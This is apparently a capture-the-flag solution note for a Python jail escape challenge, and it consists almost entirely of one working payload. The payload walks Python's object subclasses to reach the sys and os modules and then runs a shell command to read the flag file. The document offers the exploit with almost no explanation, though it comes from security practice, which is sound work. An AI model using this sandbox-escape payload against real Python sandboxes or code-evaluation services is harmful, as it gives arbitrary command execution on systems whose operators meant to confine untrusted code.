# Solve

A typical python jail escape challenge

a working payload as follows.

```py
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("cat flag*.txt")
```